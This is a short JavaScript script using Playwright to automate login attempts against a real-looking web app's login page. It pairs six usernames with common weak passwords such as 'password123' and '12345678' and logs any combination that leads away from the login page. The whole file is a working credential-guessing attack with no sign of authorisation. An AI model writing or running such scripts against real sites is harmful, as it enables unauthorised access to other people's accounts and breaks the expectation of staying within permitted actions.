import { chromium } from "/home/spil/projects/personal/portofolio-nextjs/node_modules/playwright/index.mjs";

async function testLogins() {
  const browser = await chromium.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"]
  });

  const users = ["wm", "lia", "winny", "hera", "andryhuang", "tirta"];
  const passwords = ["password123", "12345678", "password", "wm123456", "admin123"];

  for (const u of users) {
    for (const p of ["password123", "12345678", "password"]) {
      const context = await browser.newContext();
      const page = await context.newPage();
      try {
        await page.goto("https://app.nusaevo.com/login", { waitUntil: "networkidle", timeout: 15000 });
        await page.fill('input[name="code"]', u);
        await page.fill('input[name="password"]', p);
        await Promise.all([
          page.waitForNavigation({ timeout: 6000 }).catch(() => {}),
          page.click('button[type="submit"]')
        ]);
        const url = page.url();
        if (!url.includes("/login")) {
          console.log(`>>> SUCCESS login for ${u} with ${p} -> Redirected to: ${url}`);
          // Check page title and main content
          const title = await page.title();
          const h1 = await page.$eval("h1, h2, h3, .brand, .navbar-brand", el => el.innerText).catch(() => "none");
          console.log(`    Title: ${title}, Brand/Header: ${h1}`);
          await context.close();
          break;
        } else {
          // Check error message
          const err = await page.$eval(".alert, .invalid-feedback, .text-danger, .error", el => el.innerText).catch(() => "none");
          // console.log(`Failed ${u} / ${p}: ${err}`);
        }
      } catch (e) {
        // console.error(`Error ${u}:`, e.message);
      }
      await context.close();
    }
  }

  await browser.close();
}

testLogins();
